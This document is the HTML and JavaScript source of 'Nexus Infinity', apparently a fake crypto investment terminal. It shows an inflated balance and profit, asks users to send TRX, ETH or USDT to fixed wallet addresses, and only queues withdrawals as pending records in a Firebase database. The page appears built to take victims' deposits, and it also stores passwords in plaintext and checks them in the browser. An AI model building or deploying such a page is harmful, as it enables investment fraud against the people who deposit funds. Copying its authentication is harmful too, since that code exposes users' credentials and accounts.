<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Crypto Institutional Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        :root { --gold: #f3ba2f; --bg: #ffffff; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: #0f172a; margin: 0; }

        .glass-card { background: #fff; border: 1px solid rgba(0,0,0,0.05); border-radius: 28px; box-shadow: 0 10px 40px rgba(0,0,0,0.01); }
        .input-pro { background: #f8fafc; border: 2px solid transparent; border-radius: 16px; padding: 14px; width: 100%; font-weight: 700; outline: none; transition: 0.3s; }
        .input-pro:focus { border-color: var(--gold); background: #fff; }
        
        .btn-gold { background: linear-gradient(135deg, #f3ba2f 0%, #ffdb4d 100%); color: #000; font-weight: 900; padding: 16px; border-radius: 16px; width: 100%; text-transform: uppercase; letter-spacing: 1px; border: none; box-shadow: 0 10px 20px rgba(243,186,47,0.2); cursor: pointer; }
        .btn-gold:active { transform: scale(0.97); }

        .method-card { border: 2px solid #f1f5f9; border-radius: 20px; padding: 15px; cursor: pointer; transition: 0.3s; text-align: center; }
        .method-card.active { border-color: var(--gold); background: #fffdf5; }
        
        .hidden { display: none !important; }
        .nav-item { cursor: pointer; font-size: 10px; font-weight: 800; color: #94a3b8; text-align: center; }
        .nav-item.active { color: #000; }
    </style>
</head>
<body>

    <div id="splash" class="fixed inset-0 bg-black z-[9999] flex flex-col items-center justify-center">
        <div class="w-16 h-16 bg-white text-black rounded-2xl flex items-center justify-center text-3xl font-black mb-4">N</div>
        <h2 class="text-white font-black italic text-xl uppercase tracking-tighter">Nexus<span class="text-[#f3ba2f]">Infinity</span></h2>
    </div>

    <div id="auth-section" class="min-h-screen flex items-center justify-center p-8 hidden">
        <div class="w-full max-w-sm space-y-10 text-center">
            <div class="w-16 h-16 bg-black text-white rounded-3xl mx-auto flex items-center justify-center text-3xl font-black shadow-xl">N</div>
            <h1 class="text-3xl font-black italic uppercase tracking-tighter">Nexus<span class="text-[#f3ba2f]">Infinity</span></h1>
            <div id="login-form" class="space-y-4">
                <input type="text" id="l-user" placeholder="Terminal Username" class="input-pro text-center">
                <input type="password" id="l-pass" placeholder="Security Password" class="input-pro text-center">
                <button onclick="handleLogin()" class="btn-gold">Authorize Access</button>
                <p class="text-[10px] font-black text-slate-400 uppercase mt-4">New? <span onclick="toggleAuth(true)" class="text-black underline cursor-pointer">Register Node</span></p>
            </div>
            <div id="signup-form" class="space-y-4 hidden">
                <input type="text" id="s-user" placeholder="Create Username" class="input-pro text-center">
                <input type="password" id="s-pass" placeholder="Create Password" class="input-pro text-center">
                <button onclick="handleSignup()" class="btn-gold">Initialize ID</button>
                <p class="text-[10px] font-black text-slate-400 uppercase mt-4">Have ID? <span onclick="toggleAuth(false)" class="text-black underline cursor-pointer">Login</span></p>
            </div>
        </div>
    </div>

    <div id="dashboard-section" class="hidden pb-24">
        <nav class="sticky top-0 bg-white/80 backdrop-blur-xl border-b p-5 flex justify-between items-center z-[500]">
            <div class="flex items-center gap-2">
                <div class="w-8 h-8 bg-black text-white rounded-lg flex items-center justify-center font-black text-xs">N</div>
                <span class="font-black italic uppercase text-sm">Nexus<span class="text-[#f3ba2f]">Infinity</span></span>
            </div>
            <button onclick="logout()" class="text-slate-300"><i class="fa-solid fa-power-off"></i></button>
        </nav>

        <div id="page-home" class="p-6 space-y-6">
            <div class="glass-card p-10 bg-slate-900 text-white relative overflow-hidden">
                <div class="absolute top-0 right-0 p-4 opacity-20 text-4xl italic font-black">ELITE</div>
                <p class="text-[9px] font-black text-slate-400 uppercase tracking-widest mb-2">Institutional Balance</p>
                <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter">$0.00</h2>
                <div class="flex gap-3 mt-8">
                    <button onclick="switchPage('deposit')" class="flex-1 bg-[#f3ba2f] text-black p-4 rounded-xl text-[9px] font-black uppercase">Deposit</button>
                    <button onclick="switchPage('withdraw')" class="flex-1 border border-slate-700 p-4 rounded-xl text-[9px] font-black uppercase text-white">Withdraw</button>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <div class="glass-card p-6 text-center"><p class="text-[8px] font-black text-slate-300 uppercase">Profit</p><p id="profit-txt" class="font-black text-green-500 text-sm">+$0.00</p></div>
                <div class="glass-card p-6 text-center"><p class="text-[8px] font-black text-slate-300 uppercase">Status</p><p class="font-black text-blue-500 text-[10px]">VERIFIED NODE</p></div>
            </div>

            <div class="glass-card p-6">
                <h3 class="text-[10px] font-black uppercase mb-4 tracking-widest">Active Roadmap</h3>
                <div class="space-y-3">
                    <div class="flex items-center gap-3"><div class="w-2 h-2 bg-green-500 rounded-full"></div><p class="text-[10px] font-bold">Q1: Crypto Liquidity Bridge (Active)</p></div>
                    <div class="flex items-center gap-3 opacity-30"><div class="w-2 h-2 bg-slate-300 rounded-full"></div><p class="text-[10px] font-bold">Q3: Global P2P Exchange</p></div>
                </div>
            </div>
        </div>

        <div id="page-deposit" class="p-6 space-y-6 hidden">
            <h3 class="font-black italic uppercase text-lg">Initialize Deposit</h3>
            <div class="glass-card p-6 space-y-5">
                <p class="text-[10px] font-black text-slate-400">SELECT NETWORK:</p>
                <div class="grid grid-cols-3 gap-2">
                    <div class="method-card active" onclick="selectDep('trx')"><i class="fa-solid fa-coins block mb-1"></i><p class="text-[8px] font-black">TRX</p></div>
                    <div class="method-card" onclick="selectDep('eth')"><i class="fa-brands fa-ethereum block mb-1"></i><p class="text-[8px] font-black">ETH</p></div>
                    <div class="method-card" onclick="selectDep('usdt')"><i class="fa-solid fa-dollar-sign block mb-1"></i><p class="text-[8px] font-black">USDT</p></div>
                </div>

                <div class="bg-slate-50 p-4 rounded-xl break-all">
                    <p class="text-[8px] font-black text-slate-400 mb-1 uppercase">Official Receive Address:</p>
                    <p id="dep-address" class="text-[10px] font-bold text-slate-700">TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76</p>
                </div>

                <input type="number" id="dep-amount" placeholder="Amount (USD)" class="input-pro">
                <input type="text" id="dep-tid" placeholder="Transaction Hash / ID" class="input-pro">
                <div class="text-left">
                    <label class="text-[9px] font-black text-slate-300 uppercase">Upload Proof (Screenshot):</label>
                    <input type="file" id="dep-proof" accept="image/*" class="mt-2 text-[10px]">
                </div>
                <button onclick="submitDeposit()" class="btn-gold">Confirm Asset Transfer</button>
            </div>
        </div>

        <div id="page-withdraw" class="p-6 space-y-6 hidden">
            <h3 class="font-black italic uppercase text-lg">Withdraw Assets</h3>
            <div class="glass-card p-6 space-y-4">
                <select id="w-method" class="input-pro">
                    <option value="trx">TRX (Trust Wallet)</option>
                    <option value="eth">ETH (MetaMask)</option>
                    <option value="usdt">USDT TRC-20 (Binance)</option>
                </select>
                <input type="text" id="w-addr" placeholder="Your Wallet Address" class="input-pro">
                <input type="number" id="w-amount" placeholder="Amount to Withdraw" class="input-pro">
                <button onclick="submitWithdraw()" class="btn-gold">Submit Withdrawal</button>
            </div>
        </div>

        <div class="fixed bottom-0 left-0 right-0 bg-white border-t p-4 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item active"><i class="fa-solid fa-house-chimney block text-lg mb-1"></i>Home</div>
            <div onclick="switchPage('deposit')" class="nav-item"><i class="fa-solid fa-arrow-down-to-bracket block text-lg mb-1"></i>Deposit</div>
            <div onclick="switchPage('withdraw')" class="nav-item"><i class="fa-solid fa-paper-plane block text-lg mb-1"></i>Send</div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
          apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0",
          authDomain: "live-54fb4.firebaseapp.com",
          databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com",
          projectId: "live-54fb4",
          storageBucket: "live-54fb4.firebasestorage.app",
          messagingSenderId: "781910562842",
          appId: "1:781910562842:web:07a887f860d30fd17d99a3"
        };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const addresses = {
            trx: "TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76",
            eth: "0xD9359EADE5F5bACA51fb7da043767Bc0685bC355",
            usdt: "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ"
        };

        window.onload = () => {
            setTimeout(() => {
                document.getElementById('splash').style.display = 'none';
                const user = localStorage.getItem('nexus_user');
                if(user) showDashboard(user);
                else document.getElementById('auth-section').classList.remove('hidden');
            }, 2500);
        };

        window.selectDep = (type) => {
            document.querySelectorAll('.method-card').forEach(c => c.classList.remove('active'));
            event.currentTarget.classList.add('active');
            document.getElementById('dep-address').innerText = addresses[type];
        };

        window.switchPage = (p) => {
            ['home', 'deposit', 'withdraw'].forEach(pg => document.getElementById('page-'+pg).classList.add('hidden'));
            document.getElementById('page-'+p).classList.remove('hidden');
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
        };

        window.handleSignup = async () => {
            const u = document.getElementById('s-user').value.trim();
            const p = document.getElementById('s-pass').value.trim();
            if(!u || !p) return alert("Error: Required fields!");
            const snap = await get(ref(db, `users/${u}`));
            if(snap.exists()) return alert("Node ID already active!");
            await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 });
            alert("ID Initialized!");
            toggleAuth(false);
        };

        window.handleLogin = async () => {
            const u = document.getElementById('l-user').value.trim();
            const p = document.getElementById('l-pass').value.trim();
            const snap = await get(ref(db, `users/${u}`));
            if(snap.exists() && snap.val().password === p) {
                localStorage.setItem('nexus_user', u);
                showDashboard(u);
            } else alert("Authorization Failed!");
        };

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard-section').classList.remove('hidden');
            onValue(ref(db, `users/${uid}`), (snap) => {
                if(snap.exists()) {
                    document.getElementById('balance-txt').innerText = '$' + (snap.val().balance || 0).toLocaleString();
                    document.getElementById('profit-txt').innerText = '+$' + (snap.val().profit || 0).toLocaleString();
                }
            });
        }

        window.submitDeposit = async () => {
            const user = localStorage.getItem('nexus_user');
            const amt = document.getElementById('dep-amount').value;
            const tid = document.getElementById('dep-tid').value;
            const file = document.getElementById('dep-proof').files[0];
            if(!amt || !tid || !file) return alert("Validation Failed!");

            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = async () => {
                await push(ref(db, 'admin/deposits'), {
                    user: user, amount: amt, tid: tid, proof: reader.result, status: 'pending', date: new Date().toISOString()
                });
                alert("Deposit Logged. Awaiting Verification.");
                switchPage('home');
            };
        };

        window.submitWithdraw = async () => {
            const user = localStorage.getItem('nexus_user');
            const addr = document.getElementById('w-addr').value;
            const amt = document.getElementById('w-amount').value;
            const method = document.getElementById('w-method').value;
            if(!amt || !addr) return alert("Enter wallet details!");

            await push(ref(db, 'admin/withdrawals'), {
                user: user, wallet: addr, amount: amt, method: method, status: 'pending', date: new Date().toISOString()
            });
            alert("Withdrawal Sequence Started.");
            switchPage('home');
        };

        window.toggleAuth = (s) => {
            document.getElementById('login-form').classList.toggle('hidden', s);
            document.getElementById('signup-form').classList.toggle('hidden', !s);
        };
        window.logout = () => { localStorage.clear(); location.reload(); };
    </script>
</body>
</html>
